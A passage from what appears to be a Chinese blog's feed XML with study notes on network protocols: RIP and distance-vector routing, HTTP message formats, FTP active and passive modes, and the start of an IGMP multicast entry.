title="距离向量路由选择协议:"></a>距离向量路由选择协议:</h5><ol><li>从路由器到直接连接的网络的距离定义为1</li><li>从路由器到非直接连接的网络的距离定义为所经过的路由器数加1，因此也称为“跳数”</li><li>每个节点维护一个到其它节点的最小距离向量表</li><li>初始状态下，每个节点只知道到与它直接相连的节点的代价</li><li>节点周期性地向其所有相邻节点发送它的路由表信息</li><li>当一个节点从邻站收到路由表信息时，使用<strong>Bellman-Ford算法</strong>更新其路由表</li></ol><h3 id="二、RIP协议："><a href="#二、RIP协议：" class="headerlink" title="二、RIP协议："></a>二、RIP协议：</h3><h4 id="2-1：路由信息协议-Routing-Information-Protocol"><a href="#2-1：路由信息协议-Routing-Information-Protocol" class="headerlink" title="2.1：路由信息协议(Routing Information Protocol)"></a>2.1：路由信息协议(Routing Information Protocol)</h4><p>应用较早、使用较普遍的<strong>内部网关协议</strong>，适用于小型同类网络，是典型的<strong>距离向量路由协议</strong>。</p><blockquote><ul><li><p style="color:orange;">通过广播UDP协议520端口封装成的报文来交换路由信息，默认每30秒发送一次路由信息更新报文</p></li><li><p style="color:orange;">RIP使用跳数作为路由距离度量，即数据报到达目标设备所必须经过的路由器数目</p></li><li><p style="color:orange;">RIP最多支持的跳数为15，跳数16表示不可达</p></li></ul></blockquote><h5 id="RIP的工作原理"><a href="#RIP的工作原理" class="headerlink" title="RIP的工作原理"></a>RIP的工作原理</h5><ol><li>路由器启动时，路由表中只包含直通路由。运行RIP后，路由器会发送Request报文，用来请求邻居路由器的RIP路由</li><li>运行RIP的邻居路由器收到该Request报文后，会根据自己的路由表，生成Response报文进行回复</li><li>路由器在收到Response报文后，会将相应的路由添加到自己的路由表中</li><li>RIP网络稳定以后，每个路由器会<strong>周期性</strong>的向<strong>邻居路由器</strong>通稿自己的<strong>整张路由表</strong>中的路由信息，默认周期为30秒。邻居路由器根据收到的路由信息刷新自己的路由表</li><li>路由表中的每一路由项都对应了一个老化定时器，当路由项在180秒内没有任何更新时，定时器超时，该路由项的度量值变为不可达</li><li>某路由项的度量值变为不可达后，该路由会在Response报文中发布四次(120秒)，然后从路由表中清除。</li></ol><h5 id="RIP协议的特点"><a href="#RIP协议的特点" class="headerlink" title="RIP协议的特点"></a>RIP协议的特点</h5><p>仅和相邻路由器交换信息。</p><pre class="line-numbers language-none"><code class="language-none">交换的信息是当前本路由器所知道的全部信息，即自己的路由表按固定的时间间隔交换路由信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="RIPv1-vs-RIPv2"><a href="#RIPv1-vs-RIPv2" class="headerlink" title="RIPv1 vs RIPv2"></a>RIPv1 vs RIPv2</h5><p><strong>RIPv1</strong></p><blockquote><p style="color:orange;">有类别路由协议，不支持VLSM和CIDR且不支持认证。以广播的形式发送报文，目的IP地址为广播地址255.255.255.255</p></blockquote><p><strong>RIPv2</strong></p><blockquote><p style="color:orange;">无类别路由协议，支持VLSM、路由聚合与CIDR，支持明文认证和MD5密文认证，以广播或者组播(224.0.0.9)方式发送报文</p></blockquote><h4 id="2-2：RIP协议报文格式："><a href="#2-2：RIP协议报文格式：" class="headerlink" title="2.2：RIP协议报文格式："></a>2.2：RIP协议报文格式：</h4><h5 id="RIPv1的报文格式："><a href="#RIPv1的报文格式：" class="headerlink" title="RIPv1的报文格式："></a>RIPv1的报文格式：</h5><img src="./网际协议IP/RIPv1的报文格式.png" style="zoom:67%;" /><p> 每个字段的值和作用</p><blockquote><p>Command:表示该报文是一个请求报文还是响应报文，1表示该报文是请求报文，2表示该报文是响应报文</p><p>Version:表示RIP的版本信息。对于RIPv1，该字段的值为1</p><p>Address Family ldentifier (AFI):表示地址标识信息，对于IP协议，其值为2</p><p>lP address:表示该路由条目的目的IP地址。这一项可以是网络地址、主机地址</p><p>Metric:路由条目的度量值，取值范围1-16。</p></blockquote><blockquote><p style="color:blue;">一个RIP路由更新消息中最多可包含25条路由表项，每个路由表项都携带了目的网络的地址和度量值。整个RIP报文大小限制为不超过504字节，如果整个路由表的更新消息超过该大小，需要发送多个RIPv1报文</p></blockquote><h5 id="RIPv2的报文格式："><a href="#RIPv2的报文格式：" class="headerlink" title="RIPv2的报文格式："></a>RIPv2的报文格式：</h5><img src="./网际协议IP/RIPv2的报文格式.png" style="zoom: 50%;" /><p><strong>RIPv1与RIPv2的不同的字段</strong></p><blockquote><p>AFI:地址族标识除了表示支持的协议类型外，还可以用来描述认证信息<br>Route tag:用于标记外部路由。<br>Subnet Mask:指定IP地址的子网掩码，定义IP地址的网络或子网部分<br>Next Hop:指定通往目的地址的下—跳IP地址。</p></blockquote><h3 id="三、RIP环路："><a href="#三、RIP环路：" class="headerlink" title="三、RIP环路："></a>三、RIP环路：</h3><p>RIP网络正常运行时，RTA会通过RTB学习到10.0.0.0/8网络的路由，度量值为1。一旦路由器RTB的直连网络10.0.0.0/8产生故障，RTB会立即检测到该故障，并认为该路由不可达。此时，RTA还没有收到该路由不可达的信息，于是会继续向RTB发送通往10.0.0.0/8的路由信息。RTB会学习此路由信息，认为可以通过RTA到达10.0.0.0/8网络，度量值为2。<br>此后，RTB发送的更新路由表，又会导致RTA路由表的更新，RTA会新增一条度量值为3的10.0.0.0/8网络路由表项，从而形成路由环路。这个过程会持续下去，直到度量值为16。</p><h4 id="环路避免-水平分割"><a href="#环路避免-水平分割" class="headerlink" title="环路避免-水平分割"></a>环路避免-水平分割</h4><p>路由器从某个接口学到的路由，不会从该接口再发回给邻居路由器。</p><blockquote><p>RTA从RTB学习到的10.0.0.0/8网络的路由不会再从RTA的接收接口重新通告给RTB，由此避免了路由环路的产生。</p></blockquote><img src="./网际协议IP/水平分割.png" style="zoom:67%;" /><h4 id="环路避免-毒性反转"><a href="#环路避免-毒性反转" class="headerlink" title="环路避免-毒性反转"></a>环路避免-毒性反转</h4><p>毒性反转机制的实现可以使错误路由立即超时。<br>毒性反转是指路由器从某个接口学到路由后，将该路由的跳数设置为16，并从原接收接口发回给邻居路由器</p><img src="./网际协议IP/毒性反转.png" style="zoom:67%;" /><h4 id="环路避免-触发更新"><a href="#环路避免-触发更新" class="headerlink" title="环路避免-触发更新"></a>环路避免-触发更新</h4><p style="color:skyblue;">触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文，而不需要等待更新定时器超时，从而加速了网络收敛</p><img src="./网际协议IP/触发更新.png" style="zoom:67%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;地址解析协议-ARP&quot;&gt;&lt;a href=&quot;#地址解析协议-ARP&quot; class=&quot;headerlink&quot; title=&quot;地址解析协议 ARP&quot;&gt;&lt;/a&gt;地址解析协议 ARP&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;ARP的定义与基本功能&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>超文本传输协议HTTP</title>
    <link href="https://shierjinghuang.github.io/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <id>https://shierjinghuang.github.io/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-11-18T15:13:23.000Z</published>
    <updated>2025-03-27T09:44:11.973Z</updated>
    
    <content type="html"><![CDATA[<h2 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a>超文本传输协议HTTP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握HTTP的报文格式</span><span class="token comment">#掌握HTTP的工作原理</span><span class="token comment">#掌握HTTP常用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="万维网体系结构"><a href="#万维网体系结构" class="headerlink" title="万维网体系结构"></a>万维网体系结构</h3><p>万维网，全称为World Wide Web，是一个由许多互相链接的超文本组成的系统，通过互联网访问。</p><ul><li>在这个系统中，每个有用的事物，称为“资源”，由全局“统一资源标识符(URL)”标识;这些资源通过超文本传输协议传送给用户，用户通过点击超链接来获得资源</li><li>每一个网站保存有一个或多个文档，叫做万维网页面。浏览器用来读取万维网上的文档<ul><li>客户需要查看网站A的某些信息，它向网站A发送一个请求，请求包含了网站A和其中万维网页面的地址，称为统一资源定位符(URL)</li><li>网站A收到请求后，将指定的文档发送给这个客户。</li></ul></li></ul><img src=".\HTTP协议\用户访问万维网示意图.png" style="zoom:67%;" /><center>用户访问万维网的示意图</center>> <p style="color:orange;">WWW服务是分布式的客户/服务器模式</p><p><strong>浏览器：</strong>客户端程序，可以解释和显示万维网页面。</p><p><strong>服务器：</strong></p><blockquote><ul><li>万维网页面存储在服务器上，当客户请求到达时，对应的页面就发送给客户</li><li>为了提高效率，服务器通常在其高速缓存中存放被请求过的页面</li><li>通过多线程或多进程可使服务器的效率更加提高，服务器在同一时间可回答多个请求</li></ul></blockquote><h4 id="统一资源定位符（URL"><a href="#统一资源定位符（URL" class="headerlink" title="统一资源定位符（URL)"></a>统一资源定位符（URL)</h4><blockquote><p style="color:orange;">Uniform Resource Locator，用于表示Internet上资源的位置和访问方法</p></blockquote><ul><li>URL由4部分组成:<ol><li><p><strong>协议</strong>:指定了用这个URL的客户/服务器程序。如，HTTP、FTP和TELNET等</p></li><li><p>主机:指明了信息所存放的地址，可以是逻辑地址也可以是相应的域名</p></li><li><p>端口:指定了使用主机的某个端口，端口是可选的。</p><blockquote><p style="color:blue;">如果包含了端口，那么端口就插入在主机和路径之间，和主机用冒号分隔开</p></blockquote></li><li><p>路径:指定了文件存放的位置。路径本身可以包含斜线，用于将目录与子目录和文件分隔开。</p></li></ol></li></ul><img src=".\HTTP协议\统一资源定位符.png" style="zoom:50%;" /><center>统一资源定位符格式:</center>##### 静态文档<p>内容固定的文档，由服务器创建。文档的内容是在创建文档时就确定的，而不是在使用它时。</p><h5 id="动态文档"><a href="#动态文档" class="headerlink" title="动态文档"></a>动态文档</h5><p>在浏览器请求该文档时才由万维网服务器创建出来。当请水到丛的，力维网服务器就运行创建动态文档的应用程序。服务器返回这个程序或脚本的输出，把它作为对请求该文档的浏览器的响应。<br>对每个请求都创建出新的文档，所以每个请求得到的动态文档内容可能不同。</p><h5 id="活动文档"><a href="#活动文档" class="headerlink" title="活动文档"></a>活动文档</h5><p>有些文档需要程序在客户端运行，称为活动文档。当浏览器请求活动文档时，服务器就发送这个文档的一个副本或脚本，然后这个文档就在客户（浏览器)端运行。</p><h3 id="HTTP报文格式："><a href="#HTTP报文格式：" class="headerlink" title="HTTP报文格式："></a>HTTP报文格式：</h3><p>超文本传输协议，Hyperlext Transfer Protocol，用于访问万维网上的数据</p><p>它是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。<br>协议以普通文本、超文本、音频、视频等格式传输数据，它可以快速的在文档之间跳转</p><ul><li><blockquote><p style="color:orange;">HTTP是一个应用层协议，它使用TCP连接进行可靠的传送，在熟知端口80上提供服务。</p></blockquote></li></ul><blockquote><p style="color:black;">HTTP报文有两种类型:请求报文和响应报文</p>- 两种报文格式只有开始行不同。</blockquote><ul><li><p> 首部行</p></li><li><p>用来说明浏览器、服务器或报文主体的一些信息。</p></li><li><p>由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，结束的地方都要有回车换行</p></li><li><p>首部可以有好几行，但也可以不使用。</p></li><li><p>整个首部行结束时，还要有一个空行将首部行和后面的实体主体分</p></li><li><p>实体主体</p><ul><li>在请求报文中一般不用，而在响应报文中也可能没有这个字段</li></ul></li></ul><h4 id="HTTP请求报文："><a href="#HTTP请求报文：" class="headerlink" title="HTTP请求报文："></a>HTTP请求报文：</h4><img src=".\HTTP协议\HTTP请求报文.png" style="zoom:67%;" /><ul><li><p>方法:</p><ul><li><p>常见的有GET和POST方法，在地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，POST方法要求服务器接受附在请求后面的数据，常用于提交表单。</p><img src=".\HTTP协议\HTTP方法.png" style="zoom:67%;" /></li></ul></li><li><p>URL:向服务器请求的资源</p></li><li><p>HTTP版本:目前是http/1.1。</p></li><li><p>首部字段：</p><ul><li>Accept:指定客户端接受哪些类型的信息，如text/html,image/gif等</li><li>Accept-Language:指定一种自然语言。</li><li>Accept-Encoding:指定可接受的内容编码，如gzip, deflate。</li><li>User-Agent: 允许客户端将它的操作系统、浏览器和其它属性告诉服务器</li><li>Host:目标服务器</li><li>Connection:连接状态，如Keep-Alive，Close。</li></ul></li></ul><h4 id="HTTP回应报文"><a href="#HTTP回应报文" class="headerlink" title="HTTP回应报文"></a>HTTP回应报文</h4><img src=".\HTTP协议\HTTP回应报文.png" style="zoom:67%;" /><ul><li><p>版本:与请求报文相同</p></li><li><p>状态码:表示服务器的响应类型，有三位数字组成，其中第一个数字定义了响应的类别，有五种可能取值:</p><blockquote><ul><li>1xx:通知信息—表示请求已接收，继续处理</li><li>2xx:成功—表示请求已被成功接收、理解、接受</li><li>3xx:重定向一用于已经移动的文件</li><li>4xx:客户端错误—请求有语法错误或请求无法实现</li><li>5xx:服务器端错误—服务器失效无法完成请求</li></ul></blockquote></li></ul><img src=".\HTTP协议\HTTP协议状态码.png" style="zoom: 50%;" /><center>HTTP协议状态码：</center>- 短语:解释状态码的简单短语- 首部字段  - Date:消息产生时间  - Server:服务器用来处理请求的软件  - Set- cookie:设置Cookie及其路径  - Content-Length:实体正文的长度，十进制  - Connection:连接状态。  - Content-Type:发送给接收者的实体正文的媒体类型，如Content-Type:text/html;charset=GB2312。<h3 id="持久与非持久链接"><a href="#持久与非持久链接" class="headerlink" title="持久与非持久链接"></a>持久与非持久链接</h3><h4 id="非持久连接"><a href="#非持久连接" class="headerlink" title="非持久连接"></a>非持久连接</h4><ul><li>对每一个请求/响应都要建立一次TCP连接</li><li>非持久连接策略给服务器造成了很大的开销，因为服务器需要N个不同的缓存，而每次打开连接时都要使用慢开始过程</li><li>版本1.1以前的HTTP协议默认是非持久连接</li></ul><h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul><li><p>在使用持久连接时，服务器在发送响应后，让连接继续为一些请求打开</p></li><li><p>服务器可以在客户发送关闭请求时等待或关闭这个连接。</p></li><li><p>服务器可在相同的TCP连接上向客户发送多个对象</p><blockquote><p>HTTP版本1.1默认使用持久连接策略。</p></blockquote></li></ul><h3 id="万维网的工作过程："><a href="#万维网的工作过程：" class="headerlink" title="万维网的工作过程："></a>万维网的工作过程：</h3><p>每个万维网网点都有一个服务器,它不断地监听TCP的端口80，以便发现是否有浏览器（即万维网客户)向它发出连接建立请求。一旦监听到连接请求并建立了TCP连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后释放TCP连接。</p><img src=".\HTTP协议\万维网工作过程.png" style="zoom:67%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;超文本传输协议HTTP&quot;&gt;&lt;a href=&quot;#超文本传输协议HTTP&quot; class=&quot;headerlink&quot; title=&quot;超文本传输协议HTTP&quot;&gt;&lt;/a&gt;超文本传输协议HTTP&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-pyt</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>文件传输协议FTP</title>
    <link href="https://shierjinghuang.github.io/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/"/>
    <id>https://shierjinghuang.github.io/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-11-17T13:33:24.000Z</published>
    <updated>2025-03-27T09:40:31.924Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h2><p>[TOC]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#掌握FTP的工作原理#掌握FTP常用命令的使用方法及用途<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TFP简介："><a href="#TFP简介：" class="headerlink" title="TFP简介："></a>TFP简介：</h3><p><strong>FTP (File Transfer Protocol）服务：</strong></p><p>FTP是TCP/IP网络上两台计算机之间传送文件的协议，它是在Internet上最早使用的协议之一。</p><blockquote><p style="color:blue;">FTP客户机可以给服务器发出命令来下载文件、上传文件、创建或改变服务器上的目录</p></blockquote><ul><li>原来的FTP软件多是命令行操作，有了像Filezilla这样的图形界面软件，使用FTP传输变得方便易学。</li><li>大多数FTP服务面向大众，不需要身份认证，即“匿名FTP服务器”。</li></ul><blockquote><p style="color:orange;">FTP协议是应用层的协议，它基于运输层，负责进行文件的传输</p></blockquote><ul><li>FTP是一个8位的客户端-服务器协议，能操作任何类型的文件而不需要进一步处理。</li><li>FTP服务<strong>一般运行在TCP的20和21两个端口</strong>。端口20用于在客户端和服务器之间<strong>传输数据流</strong>，而端口21用于<strong>传输控制流</strong>，并且是命令通向ftp服务器的入口</li></ul><h3 id="两种TCP连接"><a href="#两种TCP连接" class="headerlink" title="两种TCP连接"></a>两种TCP连接</h3><blockquote><p>控制连接:建立之后一直持续到客户和服务器间的通信完成为止，用于传送控制命令，服务器使用21号端口</p></blockquote><blockquote><p>数据连接:根据通信的需要随时建立和释放，用于数据传输，服务器通常使用20号端口</p></blockquote><h5 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接:"></a>控制连接:</h5><p>创建步骤:服务器在熟知端口21发出被动打开，等待客户，客户使用临时端口发出主动打开。</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\创建TCP连接.png" style="zoom:67%;" /><h5 id="数据连接："><a href="#数据连接：" class="headerlink" title="数据连接："></a>数据连接：</h5><ul><li><strong>主动模式</strong>(PORT)由服务器端向客户端发起数据连接</li><li><strong>被动模式</strong>(PASV)由客户端向服务器端发起数据连接</li></ul><blockquote><p style="color:orange;">主动模式是服务器主动连接客户的数据端口，被动模式是服务器被动地等待客户连接自己的数据端口</p></blockquote><h4 id="主动模式下的FTP服务"><a href="#主动模式下的FTP服务" class="headerlink" title="主动模式下的FTP服务"></a>主动模式下的FTP服务</h4><p><strong>PORT(主动)模式的默认数据端口是20，控制端口是21</strong></p><ul><li><strong>连接过程</strong><ul><li>连接时，客户端使用随机的端口N(N&gt;1024)连接服务器的控制端口21建立控制连接</li><li>然后客户端开放N+1号端口进行监听，并通过控制连接向服务器发送命令PORT N+1</li><li>服务器用自己的数据端口20连接到客户端的N+1端口，建立数据连接。</li></ul></li></ul><h5 id="主动模式存在的问题："><a href="#主动模式存在的问题：" class="headerlink" title="主动模式存在的问题："></a>主动模式存在的问题：</h5><blockquote><p style="color:orange;">PORT(主动)模式发送端口给服务器，由服务器连回客户端</p></blockquote><ol><li>如果客户端有防火墙，这样的连接会被认为是外部主机试图连接内部的主机，通常情况下是不允许的</li><li>为了解决这个问题，引入了PASV（被动）模式。</li></ol><h4 id="被动模式下的FTP服务"><a href="#被动模式下的FTP服务" class="headerlink" title="被动模式下的FTP服务"></a>被动模式下的FTP服务</h4><ul><li><p>连接过程</p><ul><li>连接时，客户端使用一个随机的端口N(N&gt;1024)连接服务器的21端口建立控制连接</li><li>通过控制连接向服务器发送命令PASV (被动模式)。</li><li>服务器使用一个随机的数据端口M(M&gt;1024)并通过控制连接发回客户端</li><li>客户端用数据端口N+1连接服务器的端口M。</li></ul><p>由于是客户端主动发起数据连接，这样就解决了防火墙带来的问题。</p></li></ul><h3 id="FTP通信："><a href="#FTP通信：" class="headerlink" title="FTP通信："></a>FTP通信：</h3><p><strong>控制连接上的通信：</strong>FTP使用NVT ASCII字符集在控制连接上通信。通信过程使用命令和响应来完成，命令和响应都是一个短行，因此不必考虑它的文件结构。每一行以回车换行结束</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP控制链路上的通信.png" style="zoom:50%;" /><p><strong>数据连接上的通信：</strong>在传送数据之前，客户使用控制连接来做传输准备，定义文件类型、数据结构、传输方式</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP数据连接上的通信.png" style="zoom:50%;" /><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><ol><li>ASCII文件:传送文本文件的默认格式。每一个字符使用NVT ASCII进行编码。发送端把文件从它自己的表示转换成NVT ASCII字符，而接收端从NVT ASCII字符转换成它自己的字符</li><li>EBCDIC文件:若连接的一端或两端使用EBCDIC编码，则可使用EBCDIC编码传送文件</li><li>图像文件:传送二进制文件的默认格式。这种文件是作为连续的比特流传送而没有任何解释或编码。在大多数情况下它用来传送二进制文件，如已编译的程序。</li></ol><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><ul><li>文件结构（默认)︰这种文件没有结构，它是连续的字节流</li><li>记录结构:这种文件划分为一些记录，这只能用于文本文件</li><li>页面结构:这种文件划分为一些页面，每一个页面有页面号和页面首部。页面可以随机地或顺序地进行存取</li></ul><h4 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h4><blockquote><p>流方式:这是默认方式。数据作为连续的字节流从FTP交付给TCP。TCP负责把数据划分为适当大小的报文。若数据是简单的字节流（文件结构），就不需要文件结束符。若数据划分为记录（记录结构)，则每一个记录有1字节的记录结束（EOR）字符，而在文件的结束处有文件结束（EOF）字符。</p></blockquote><blockquote><p>块方式:数据可以按块从FTP交付给TCP。每一个块的前面有3字节首部。第一个字节叫做块描述符，后两个字节定义块的大小，以字节为单位。</p></blockquote><blockquote><p>压缩方式:若文件很大，数据可进行压缩。通常使用的压缩方法是游程长度编码。数据单元的连续出现数可以用一个“出现”和“重复数”来替换。在文本文件中，这通常是空格。在二进制文件中，空字符常常被压缩。</p></blockquote><h4 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h4><blockquote><p>从服务器把文件复制到客户端叫做<strong>读取</strong>文件，使用RETR命令完成</p></blockquote><blockquote><p>从客户端把文件复制到服务器叫做<strong>存储</strong>文件，使用STOR命令完成。</p></blockquote><p>从服务器向客户端发送目录列表或文件名，使用LIST命令完成。FTP把目录或文件名列表当作文件，在数据连接上发送。</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP文件传送.png" style="zoom:67%;" /><h3 id="FTP响应与命令："><a href="#FTP响应与命令：" class="headerlink" title="FTP响应与命令："></a>FTP响应与命令：</h3><blockquote><p style="color:blue;">FTP使用控制连接在客户进程和服务器进程之间完成交互操作，客户端向服务器发送命令，服务器给客户返回响应</p></blockquote><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><ul><li>命令形式是ASCII大写字符，后面的变量可以有，也可以没有。</li><li>命令可以粗略地划分为6组:接口命令、文件管理命令、数据格式化命端口定义命令、文件传送命令以及杂项命令。</li></ul><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP命令.png" style="zoom: 50%;" /><h5 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h5><blockquote><p style="color:blue;">每一个FTP命令都应该有响应。响应由两个部分组成:3个数字以及跟随在后面的文本。数字部分定义代码，文本部分定义所需的参数或额外的解释</p></blockquote><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP相应.png" style="zoom:67%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件传输协议FTP&quot;&gt;&lt;a href=&quot;#文件传输协议FTP&quot; class=&quot;headerlink&quot; title=&quot;文件传输协议FTP&quot;&gt;&lt;/a&gt;文件传输协议FTP&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;pre class=&quot;line-numbers languag</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Internet组管理协议IGMP</title>
    <link href="https://shierjinghuang.github.io/2022/11/16/IGMP/"/>
    <id>https://shierjinghuang.github.io/2022/11/16/IGMP/</id>
    <published>2022-11-16T12:13:20.000Z</published>
    <updated>2025-03-27T09:53:06.444Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a>Internet组管理协议IGMP</h2><p>[TOC]</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握IGMP协议的报文格式</span><span class="token comment"># 掌握IGMP协议的工作原理</span><span class="token comment"># 理解多播组地址到以太网地址的映射</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单播与多播与广播"><a href="#单播与多播与广播" class="headerlink" title="单播与多播与广播:"></a>单播与多播与广播:</h3><blockquote><p style="color:red;">单播(unicast):    单个源站与单个目的站之间的通信叫作单播，IP数据报中的源IP地址和目的IP地址分别代表了源站和目的站。</p></blockquote><blockquote><p style="color:blue;">绝大多数的网络应用程序是单播</p></blockquote><blockquote><p style="color:red;">多播/组播(multicast): 一个源站和多个目的站之间的通信叫作多播。</p></blockquote><blockquote><ul><li>IP数据报中的源地址是单播地址，目的地址是组地址(D类地址)</li><li>路由器收到组播数据包后，可从它的多个接口转发出去<br>目前，组播机制没有被广泛支持，主要的组播路由机制有距离向量多播路由协议(DVMRP)和协议无关组播(PIM) .</li></ul></blockquote><blockquote><p style="color:red;">广播(broadcast):广播源站和目的站是一对多的，源站只有一个，但所有其它主机都是目的站Internet不支持广播，因为这会产生非常大的通信量</p></blockquote><h4 id="组播"><a href="#组播" class="headerlink" title="组播:"></a>组播:</h4><p>优点：采用组播技术后，即使用户数量成倍增长，主干网带宽不需要随之增加。从而解决了宽带应用对带宽和服务质量的要求问题</p><img src=".\IGMP\组播示意.png" style="zoom: 33%;" /><p>组播比多个单播具有更小的分组时延</p><h5 id="组播地址范围："><a href="#组播地址范围：" class="headerlink" title="组播地址范围："></a>组播地址范围：</h5><blockquote><ol><li>IANA(国际因特网地址分配委员会）把D类地址空间用于IP组播地址</li><li>IP组播地址的范围是:224.0.0.0~239.255.255.255</li><li>常用的组播地址<ul><li>224.0.0.1        在本子网上的所有参加多播的主机和路由器</li><li>224.0.0.2        在本子网上的所有参加多播的路由器</li><li>224.0.0.5        用来给一个网段中所有的OSPF路由器发送OSPF路由信息</li><li>224.0.0.9        RIPv2组地址</li><li>224.0.0.11      供DHCP服务器和中继代理使用</li></ul></li></ol></blockquote><h5 id="动态的组成员"><a href="#动态的组成员" class="headerlink" title="动态的组成员"></a>动态的组成员</h5><blockquote><p style="color:orange;">多播组中的成员是动态的。一个进程可请求其主机参加某个特定组，或在任意时间退出该组</p></blockquote><h5 id="使用硬件进行多播"><a href="#使用硬件进行多播" class="headerlink" title="使用硬件进行多播"></a>使用硬件进行多播</h5><blockquote><p style="color:orange;">当数据报传送到以太网时，以太网利用硬件进行多播，交付给属于该组成员的主机</p></blockquote><h4 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h4><p>多播以太网地址的前25位是0000000100000000010111100这意味着与IP多播相对应的以太网地址范围从01005E000000到01005E7FFFFF。然后将多播IP地址的低23位映射到以太网地址中的低23位。</p><img src=".\IGMP\多播地址到以太网地址的转换.png" style="zoom: 50%;" /><p>由于D类地址的组标识字段长为28bit，将低23位复制到多播MAC地址中，有5bit未使用，所以<strong>映射是多对一的</strong>。</p><p><strong>32个多播IP地址映射到一个以太网多播地址</strong>。既然地址映射不是惟一的，那么设备驱动程序或lP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能,设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</p><h3 id="IGMP协议简介："><a href="#IGMP协议简介：" class="headerlink" title="IGMP协议简介："></a>IGMP协议简介：</h3><p>IGMP ( lnternet Group Management Protocol)协议，IGMP位于网络层。</p><p style="color:orange;">IGMP协议运行于主机和主机直接相连的路由器之间，是IP主机用来报告多播组成员身份的协议</p>利用IGMP协议，一方面可以使主机通知本地路由器希望加入并接收某个特定多播组的信息;另一方面，路由器可以周期性地查询局域网内某个已知组的成员是否处于活动状态。IGMP使用预留的组播地址224.0.0.1与本地路由器通信。<h3 id="IGMP报文格式："><a href="#IGMP报文格式：" class="headerlink" title="IGMP报文格式："></a>IGMP报文格式：</h3><p>IGMP协议目前有三个版本IGMP、IGMPv2和IGMPv3。</p><p>其中IGMPv2有3种报文类型:</p><blockquote><p>查询报文:路由器查询多播组中是否有活跃成员，分为一般查询和特定查询</p><p>成员关系报告报文:加入多播组或响应查询报文。</p><p>退出报告报文:离开多播组。</p></blockquote><h4 id="IGMPv2报文格式："><a href="#IGMPv2报文格式：" class="headerlink" 